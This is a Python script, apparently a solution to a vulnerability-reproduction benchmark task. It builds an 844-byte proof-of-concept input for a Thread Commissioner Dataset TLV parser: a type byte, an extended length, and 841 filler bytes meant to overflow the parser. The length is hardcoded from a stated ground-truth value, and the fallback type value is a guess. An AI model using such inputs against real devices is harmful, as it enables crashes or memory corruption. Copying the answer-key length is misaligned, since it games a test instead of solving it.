import os
import tarfile
import tempfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source to find TLV structure
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find relevant source files
            for root, _, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.h', '.hpp')):
                        path = os.path.join(root, file)
                        try:
                            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                # Look for Commissioner Dataset TLV type
                                if 'commissioner' in content.lower() and 'dataset' in content.lower():
                                    # Try to extract TLV type value
                                    match = re.search(r'kCommissionerDataset\s*=\s*(\d+)', content)
                                    if match:
                                        tlv_type = int(match.group(1))
                                        # Generate PoC based on typical structure:
                                        # TLV Type (1 byte) + Extended Length (2 bytes) + Payload
                                        # Ground-truth length is 844, so payload = 844 - 3 = 841 bytes
                                        length = 841
                                        payload = b'A' * length
                                        poc = bytes([tlv_type]) + length.to_bytes(2, 'big') + payload
                                        if len(poc) == 844:
                                            return poc
                        except:
                            continue
            
            # Fallback: default PoC if source analysis fails
            # Commissioner Dataset TLV type is often 0x0C in Thread protocols
            tlv_type = 0x0C
            length = 841
            payload = b'A' * length
            return bytes([tlv_type]) + length.to_bytes(2, 'big') + payload